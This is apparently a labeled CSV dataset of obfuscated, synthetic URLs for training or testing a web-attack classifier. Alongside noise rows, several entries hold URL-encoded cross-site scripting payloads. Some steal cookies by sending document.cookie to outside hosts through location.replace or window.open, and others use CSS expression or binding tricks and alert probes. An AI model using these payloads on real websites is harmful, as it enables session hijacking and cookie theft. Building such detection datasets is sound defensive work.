class,id,meta1,meta2,meta3,vector
21.0,10601,,,,/uXs5t/usEyiwescor/jQQhxlxRoZpFspA/eEUWe8_r/rZapvrQTZ0A0yE9ZVL/4k/ij7oXvcS/Ywp-6LoBMra_Y/MlAJQ21iTF.js?
18.0,10602,,,,/XJXcmd33oYz-_@@L/cNnvwui/a2o2f3/na/ht2WpYfkQ60/6servicesJpassthruYRd/SNtj/4dXjTIlVk/er/mj9os/FB7H.shtml?vea=3435&sthh6eaeeEndqp=Iu&da6nrerqlbho=admine&tqramsLAednaer=4319709&um=tqmel2qa0nn&rmplebMm8ke9doE=35419024&Hopf8K0XI=428641&TsamwuL=Nterd8swc41us&n4y9eiN=5ssincludee8b5nooe34Klunion&nshnotnt=-hOicm4yge&xc6shutdowngTi68=iaEtanedE1d6Tnth&7eers7pRr=n3kh&Orna=3
18.0,10603,,,,/ekjKP.-N1w60QX/lBl1kdLE0DLkaL3LLd/sgZgdXHrmga9k2rFe/GetcacceptiI.aspx?hlWvwlvhfp=r1Oe&pieorhzrte=76&tud4ulf6=1452&Vtirsisst=j+f+hetc%40Ld6&rlxddmd=snh3aeuzreeikswoU6&PkpHiaccept=2887968&34rozqhtpass7Rbaccept=RRHo-rnr&oir=thRtTbnOCwVc&h1aadoha72mnaO=1p7&t1taesnv=oenhDtkystyleilsa&rpC=fNt&yiwttrep1rhaa=r5hiGbI_&hiO6lOtrycjv=r1er2hmOeha&ei4wepiaovotne=tjw7Tp&gzaaeeruei=oese+ct%27n
18.0,10604,,,,/BVo0QJ/8itn/cplrn176fsuqrn/giDnsrtsnt5sLrhl/cCSy-1xF4eV/nA1y6opO_ffn/l0lTlssidqaqxjxsz/mc3hrKhc/aYC2xcz7MRJD/lpNWg/dnZzCchLK2pA6kIDvKyz.htm?eiN=36position&was=ecfnwnol&ssmeMGtr9trbbo=q6iUehr&formzxtermQphpinput-zXtdL=12
5.0,10605,,,,/ZaorodASovho/wRlB./szgMOpPHayepL1/fwvcBJ2T9/areugeElclun/Y5BEK8l5winnt/tSR3fooo2r/otlnaleigh9h8ot/4ypoln/ixI4P3y4eN0RD.js?lxe8t=%2FN&yulikegC=nhoUgymon&igdmorrq1wulg=ejX&tinrio=39690&Ttqpnerbcr=fd&3eouddoailucsa=lPUKq4TK-VJk&eshhitsljg=isopen3+-like&iigroup
24.0,10607,,,,/Rtsamu.swf?
18.0,10608,,,,childU2FpassthruVXn=nilx&j4I7@r@Dek=e&sheitonnd=beehjwkhicltet3ore&ehjetsaax=tmTr&snirasileaCezf=window.openrl &aohmtl7=s5enpasep2ltmy&vraaieeewy=a1Tl
11.0,10609,,,,/tTshaM/aeht/eohA/hhiqummialcmu/tORbt318/rJ03Rysev/IReval7Vo/hogletth/epbeo2dpoaomE0eaho/dMe2AIKN5GMM86qc8m/itYeoeDsre.gif?I9s_He=a0irorIraLacu&ds=+meeeystp
5.0,10610,,,,/fahayn6rsadn/eEG/nqi4hsn2owh/iQ-7RQKbx3..sh?TUcnullD=bEI6&tscSuhsx=oa9&w2Usi=I&deOl=71485903&wnbnech=3806&rohehnsre8io6Ec=5QJbkjrF&me=15
18.0,10612,,,,/iAZ/XRE-XB.fMKwindow.openK7/nsR.XW/ChttpD3dropdivKN/EwinntoyuU/cet/xdropJdropSw3MeGopen1i/b2ht/escVs-@MHMg/YLzef9pE7Po/zDuI/oZ5skQiFl5.pl?lncthreV3e0=35519&fLQBcytXJ=9815616&ed2eimo=atdnr
18.0,46,,,,/G6KbVingcWLXyv/9aee7sw/MEjMDlibbAYWHselectpphp/fDzbKe/iruhQptUkG/l3H@uSlttYe0/yidlnm3ie.asp?if=oTjVgM&mdyr3flrdgertb3=8%5DprarLfies+i&haikrttH=zChrlpzecsiae&eNrocsgtsss=1032086&em0p8kvesr=261543&hoe2iot6ensa=80775&l4elnis4thy=%3Cdiv+++++style++%3D+%22+++++width%3A+++expression%28%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.dedege.com%2Fcgi-bin%2Fnsin.cgi%27%2Bdocument.cookie%29%3B%5D%29%3B%22++++%3E&UxjLrujnocopy=Axsheoa2dlaorp&eahb1wl8w=514517777&erako1ho=++0gaan+zmr&eA4rhc=43&sb2mnhw2e=fsft5ors72a&3su7eDreznaVfa=Tthxterm-zscriptt%7Eaixhtoo3+&cashlsoeamZold=rnne1tee+rhn-wda&cdc9rfhoeet=xuhml
8.0,54,,,,/BE2/ups_am6I/nL@e/flwe/odrDRzt1EfJ.s/F7WW-iha/ChMcH-/SvbscriptexecrgJtu/7bcbLmqnonueO7teyslw/lFxZWYN5W/hB._@B.es98.jpg?brtpdw=321&v7psFsi=tiexedivYAlex%7C&st7syldclamEfTn=%3C%21--+--+--%3E%3Cscript+%3E%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.silenaol.com%2Fcgi-bin%2Fsiesen.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+++%3E%3C%21--+--+--%3E&fn=2527&k2IdqD=7&ota1ue=qmprx
18.0,59,,,,/DCBZunhttpsWlocation/na8ytiMA/Bgu/rU7@pO3Nyf.IZ4wRF5/meeurieiniflnn/rwwOshenaenlzg/YUVU/nNrYHuB.jpeg?rtoAx=sdocument%2Fx&hnr8=oh&te7oz=%3Cdiv+++style++%3D++++%22+++binding%3A+++++url%28%5Bhttp%3A%2F%2Fwww.rimaasis.com%2Fscript%2Fstopweto.swf%5D%29%3B++%22++++%3E&gehslNn=43&7eohHuior=input&eqeuee=80572248
13.0,100,,,,eSi4yoessaaac4T=|rct/&aeDioiIe=5533469389&ntbymstm8e=lserviceshat8rs0otetelnetnjny&rCe=617638627&jM3-v=wiMnretaa2O&metaS5a9g=cone&orrtntap=hht udivtpese%o&hL-gGPN0H=winnt1Sho&UitttHy5=931276&dbeyde421Eteduc=itde0lpa8r6xtcNa
24.0,119,,,,/2nyA9if.tiff?seers6talerrW=%3Ca++href++%3D++++%22javas%26%2399%3Bript%26%2335%3B%5Balert+%28%27tatldb1srg%27%29%3B%5D+++++%22++++%3E
24.0,124,,,,/v@4@Q/t-oxterm/802Soy@y7ap/oMS/dl8qtFczomtue/dlessbhr/h03E/XShIHWftowp-eSir/1JmJf/s9bcC.mdb?dTaaumL=4&Z21-delete3h2=rdelecmytvraef3t&linkH5-OKEyzflogn=%3Cscript++%3Ealert+++%28z8ens.ee4t%29%3C%2Fscript++++%3E&miicliirrcab=84358&Apegoe4nlT=550&kmdn9ulestesxfg=rhL&tB=p
5.0,127,,,,/zeAhwmacgsem/rrnstiaer5/icwsT2/oK_HdroQl@/rooHSVC6lJsQ_k5NST2p/eYMEo-._VdkWuW0wqR@k/d6snugRnTkk7rywMx/l8/hbH/w8/a0rXrVG8QM.pl?rcenalejcn1gie=eCJIQjfOd&clt4cm=%3C%21%5BCDATA%5B%3C%21--%5D%5D%3E%3Cscript+%3E%5Bwindow.open%28%27http%3A%2F%2F224.89.169.174%2Fis.mspx%27%2Bdocument.cookie%29%3B%5D%2F%2F--%3E%3C%2Fscript%3E
21.0,130,,,,/Ar2jNadjed6m/ul5qsMjKUmPe/hdZiHVt.6BuO.mspx?gsnn1ct7Msc=966shoxS&6aei=69870&rm=eo&othgen2aaueei=19&bAmRgb1WB9P=i%25lIlh&se6s=c5kzHNE&EpdreaAeRzo=wetb9ocrndzim9y9neii
5.0,137,,,,/yoPAJeJM/en@GxIz_U99UlEmy6w7/5fd17oDq1m/u-mCIN229Lks/itmenrtsyo4wo/Elpni2haAdisinEeaI/nellIstoittk/tdesCfUew/eDQ.asp?DlEwhereqopen1G5@qS=9&o7ienn=5Ps&-TmXgsweDnhJ=32130245&iZh=s5-objecto9s7kut&5Ct6.uk=%3Ciframe+++src+++%3D%22++vbscript%3A%5Balert+++%28%27re%27%29%3B%5D+++++%22%3E
5.0,138,,,,/eo@qg7Emug3/o6g/KW/espnl4tsttietdbflray/rHVLTFSNJAc3ZzB/ci7uf/aE9PtJVZsl.-lfZw4/inA3.swf?a5iaeqbryrp=%3DyoooC4ior1uoht6h&55i=swoormiOa4een&tirfTrlret=e5u4asneoahttpi&rtmpfrom5O-NOmetalinkZlib=cecKa9tiodhrNbded&aen2ewhoqnte=eYssau3&lpnccu=ae&CNvscriptqmDsjG=%26%3Cscript++++%3E%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.ni.com%2Fcgi-bin%2Falte.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+%3E&otTrc=olhePs
